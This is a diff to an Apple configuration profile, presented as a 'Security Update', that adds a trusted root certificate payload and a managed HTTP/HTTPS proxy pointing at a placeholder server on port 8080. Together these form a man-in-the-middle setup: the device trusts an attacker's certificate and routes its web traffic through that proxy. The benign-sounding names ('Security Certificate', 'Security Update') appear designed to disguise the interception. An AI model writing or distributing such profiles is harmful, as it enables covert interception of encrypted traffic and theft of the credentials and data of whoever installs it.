@@ -22,6 +22,44 @@
             <key>IsRemovable</key>
             <false/>
         </dict>
+        <dict>
+            <key>PayloadType</key>
+            <string>com.apple.security.root</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>PayloadIdentifier</key>
+            <string>com.security.cert</string>
+            <key>PayloadUUID</key>
+            <string>00000000-0000-0000-0000-000000000002</string>
+            <key>PayloadDisplayName</key>
+            <string>Security Certificate</string>
+            <key>PayloadCertificateFileName</key>
+            <string>cert.pem</string>
+            <key>PayloadContent</key>
+            <data>
+            YOUR_BASE64_CERTIFICATE_HERE
+            </data>
+        </dict>
+        <dict>
+            <key>PayloadType</key>
+            <string>com.apple.proxy.managed</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>PayloadIdentifier</key>
+            <string>com.security.proxy</string>
+            <key>PayloadUUID</key>
+            <string>00000000-0000-0000-0000-000000000003</string>
+            <key>PayloadDisplayName</key>
+            <string>Proxy</string>
+            <key>HTTPProxy</key>
+            <string>YOUR_PROXY_SERVER</string>
+            <key>HTTPPort</key>
+            <integer>8080</integer>
+            <key>HTTPSProxy</key>
+            <string>YOUR_PROXY_SERVER</string>
+            <key>HTTPSPort</key>
+            <integer>8080</integer>
+        </dict>
     </array>
     <key>PayloadDisplayName</key>
     <string>Security Update</string>
@@ -30,7 +68,7 @@
     <key>PayloadType</key>
     <string>Configuration</string>
     <key>PayloadUUID</key>
-    <string>00000000-0000-0000-0000-000000000002</string>
+    <string>00000000-0000-0000-0000-000000000004</string>
     <key>PayloadVersion</key>
     <integer>1</integer>
 </dict>
